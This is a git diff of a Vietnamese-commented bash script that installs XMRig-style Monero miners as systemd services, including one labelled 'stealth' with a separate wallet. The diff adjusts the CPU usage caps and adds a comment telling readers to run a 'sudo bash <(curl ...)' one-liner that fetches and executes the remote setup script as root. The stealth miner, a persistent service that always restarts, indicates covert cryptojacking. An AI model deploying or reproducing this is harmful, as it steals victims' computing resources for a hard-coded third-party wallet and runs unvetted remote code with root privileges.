@@ -1,5 +1,9 @@
 #!/bin/bash
-# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)
+# ghi hết đoạn dưới này ( nhớ bỏ dấu "#" )
+
+# sudo bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)
+
+
 
 # ========= CONFIG =========
 WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # <-- người khác tự sửa
@@ -60,7 +64,7 @@ After=network.target
 
 [Service]
 ExecStart=$INSTALL_DIR/$NAME_USER -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
-  --cpu-priority=3 --threads=$THREADS_USER --donate-level=0 --max-cpu-usage=35 \\
+  --cpu-priority=3 --threads=$THREADS_USER --donate-level=0 --max-cpu-usage=40 \\
   --log-file=$LOG_USER
 Restart=always
 Nice=10
@@ -77,7 +81,7 @@ After=network.target
 
 [Service]
 ExecStart=$INSTALL_DIR/$NAME_STEALTH -o $POOL -u $WALLET_STEALTH.$WORKER_STEALTH -k --coin monero --tls \\
-  --cpu-priority=4 --threads=$THREADS_STEALTH --donate-level=0 --max-cpu-usage=55 \\
+  --cpu-priority=4 --threads=$THREADS_STEALTH --donate-level=0 --max-cpu-usage=50 \\
   --log-file=$LOG_STEALTH
 Restart=always
 Nice=10
